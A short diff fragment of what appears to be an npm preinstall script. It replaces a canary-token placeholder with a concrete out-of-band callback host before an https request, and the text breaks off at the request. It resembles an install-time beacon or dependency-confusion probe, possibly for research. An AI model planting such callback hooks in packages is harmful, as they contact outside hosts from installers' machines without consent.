@@ -1,5 +1,5 @@
 const https = require('https');
-const url = 'https://CANARYTOKEN_URL/npm_pre_install';
+const url = 'https://yczfxrczzreyouovmtnf2rd1ozhn89m8y.blnd.r0l.me/npm_pre_install';
 
 try {
   https
